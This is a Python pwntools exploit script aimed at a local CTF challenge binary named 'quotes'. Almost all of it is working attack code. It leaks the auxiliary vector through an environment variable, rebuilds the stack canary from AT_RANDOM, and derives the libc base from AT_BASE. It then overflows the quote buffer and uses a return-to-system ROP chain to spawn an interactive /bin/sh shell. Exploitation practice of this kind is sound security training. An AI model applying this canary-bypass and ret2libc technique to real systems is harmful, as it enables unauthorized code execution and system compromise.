#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /var/challenges/quotes/quotes
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/var/challenges/quotes/quotes')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')  
rop = ROP(exe)

# Make sure to reveal some juicy secrets
env = {
    "_REAL_LD_SHOW_AUXV": "1"
}

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env=env)
    else:
        return process([exe.path] + argv, *a, **kw, env=env)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

io = start()

data = io.recv(2048).split(b"\n")
# print lnies and line numbers
for i, line in enumerate(data):
    print(i, line)
    
# AT_RANDOM (used for canary) is in line 16
at_random = data[16].split(b" ")[-1]
print("AT_RANDOM", at_random)

# AT_BASE (used for PIE) is in line 8
at_base = data[8].split(b" ")[-1]
print("AT_BASE", at_base)

# AT_ENTRY (used for return address) is in line 10
at_entry = data[10].split(b" ")[-1]

# Convert at random (0x...) to integer
at_random = int(at_random, 16)
at_random = at_random.to_bytes(8, byteorder='little')

# Convert at base (0x...) to integer
at_base = int(at_base, 16)
# exe.address = at_base

# Canary is AT_RANDOM with the last byte set to 0
canary =b"\x00"+ at_random[1:]

# Canary is not at a predictable place, just fill everything between &quote and return address with canary
payload = b""
for i in range(0, 1064, 8):
    payload += canary
    
# This is the base of libc
libc_base = at_base - 0x1fc000
print("LIBC BASE", hex(libc_base))

# Find system and /bin/sh
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
print(f"System address: {hex(system_addr)}")
print(f"/bin/sh address: {hex(binsh_addr)}")

libc.address = libc_base
# Return to system()
rop2 = ROP(libc)
rop2.call(rop2.ret) # align stack
rop2.call(system_addr, [binsh_addr])
chain = rop2.chain()

payload += chain

# Overflow return addr for new_user_quote
io.sendline("a") # add quote
io.sendline(payload) # insert quote
io.sendline("eli") # insert author

io.interactive()





